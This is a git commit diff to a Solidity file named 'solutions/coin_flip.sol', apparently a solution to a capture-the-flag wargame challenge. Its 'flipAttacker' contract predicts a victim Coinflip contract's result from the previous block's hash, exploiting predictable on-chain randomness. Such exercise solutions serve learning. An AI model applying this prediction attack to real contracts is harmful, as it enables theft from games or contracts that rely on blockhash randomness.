0d19ce640f3467a7fb7ad812cb12d42d8b415b5a
harry <gaohaoyuandd@gmail.com>
2021-07-05 23:47:11 -0400

    added coinflip

--- solutions/coin_flip.sol
+++ solutions/coin_flip.sol
@@ -3,11 +3,8 @@ contract flipAttacker{
 	Coinflip public victimContract;
 	uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
-	constructor (address _adr){
+	function attacker(bool _guess, address _adr) public {
 		victimContract = Coinflip(_adr);
-	}
-
-	function attacker(bool _guess) public {
 		uint256 blockValue = uint256(blockhash(block.number.sub(1)));
 		uint256 coinFlip = blockValue.div(FACTOR);
 		bool side = coinFlip == 1 ? true : false;
